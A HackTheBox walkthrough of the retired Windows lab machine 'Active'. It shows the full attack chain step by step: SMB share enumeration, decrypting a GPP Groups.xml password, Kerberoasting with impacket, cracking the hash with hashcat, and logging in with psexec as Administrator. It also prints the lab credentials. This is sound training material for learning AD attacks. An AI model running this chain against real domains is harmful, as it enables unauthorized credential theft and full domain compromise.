---
title: Active - HackTheBox Walkthrough
date: 2021-10-28 12:00:00 
categories: [HackTheBox,Windows]
tags: [active directory,gpp,kerberoasting]
img_path: /assets/img/HTB/Active/
image: 
  path: 00-banner.png
---
Hello guys, welcome back with another walkthrough, this time we'll be doing `Active` a retired windows machine from HackTheBox rated easy. Without further ado, let’s begin.
# Recon
## Nmap Scan
As always we’ll start with a nmap scan to discover the open ports and services.
```console
$ cat nmap-scan
# Nmap 7.91 scan initiated Wed Oct 27 18:37:48 2021 as: nmap -sC -sV -v -oN nmap-scan 10.129.245.27
Nmap scan report for 10.129.245.27
Host is up (0.12s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-10-27 23:38:24Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-10-27T23:39:23
|_  start_date: 2021-10-27T23:34:33

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 27 18:39:27 2021 -- 1 IP address (1 host up) scanned in 99.73 seconds
```

With the name of the machine and the ports open we can deduce we are tackling an Active Directory, the nmap result give us the domain: `active.htb`. Add this to `/etc/hosts` file.

## Smb Enumeration
Enumerating samba with [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) displays that `Replication` directory is readable.

```console
$ crackmapexec smb 10.129.245.27 -u '' -p '' --shares
```

![01-cme](01-cme.png)

and using `smbclient` we can access to it without password.

![02-smbclient](02-smbclient.png)

# Initial Foothold

After checking the files inside the directory I came across with `Groups.xml` which is a Group Policy Preference (GPP) file.

Download it with this commands:

```console
$ prompt OFF
$ mget Groups.xml
```

![03-groups](03-groups.png)

GPP store and use credentials in several files, this helps to the administrators to schedule tasks to change the local admin passwords on a large numbers of computers at once. This passwords are encrypted with AES-256 , the interesting thing is that [Microsoft published the AES private key ](https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx) and this allow us to decrypt the password.

Check this [site](https://adsecurity.org/?p=2288) for more information.

![04-password](04-password.png)

User| Password
-|-
SVC_TGS|GPPstillStandingStrong2k18

![05-cme](05-cme.png)

# Kerberoasting Attack

Once we have a valid credential we can perform a `Kerberoasting attack`. When authenticated user has a kerberos TGT(Ticket-Granting-Ticket) use this ticket to request a TGS(Ticket-Granting-Service) for specific resources/services on the domain, this TGS is encrypted with the hash of the service account associated with the SPN(Service Principal Name). The aim to this attack is get the TGS and crack it if the password is weak.

We'll use `GetUserSPNs.py` from impacket to get the TGS like the screenshot below.

![06-kerberos](06-kerberos.png)

> In case you get the next error: "Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)", you just need sync the date from the Kerberos server with your attack machine, do this with the next commands:

```console
$ sudo apt install ntpdate
$ ntpdate -u 10.129.245.27
```

Crack the TGS hash using `Hashcat` or `John the Ripper`.

Find the number of hash-mode [here](https://hashcat.net/wiki/doku.php?id=example_hashes)
```console
$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force
```

![07-hashcat](07-hashcat.png)

We got password!!

![08-cme](08-cme.png)

Let's use `psexec.py` to login as the administrator.

```console
psexec.py active.htb/Administrator:Ticketmaster1968@active.htb
```
![09-root](09-root.png)

That’s it for now guys. Until next time.

# Resources

Topic|Url
-|-
Exploiting GPP|[https://adsecurity.org/?p=2288](https://adsecurity.org/?p=2288)
Kerberos Authentication | [https://www.varonis.com/blog/kerberos-authentication-explained/](https://www.varonis.com/blog/kerberos-authentication-explained/)
Kerberoasting attack| [https://www.qomplx.com/qomplx-knowledge-kerberoasting-attacks-explained/](https://www.qomplx.com/qomplx-knowledge-kerberoasting-attacks-explained/)
Kerberoasting attack| [https://medium.com/@Shorty420/kerberoasting-9108477279cc](https://medium.com/@Shorty420/kerberoasting-9108477279cc)
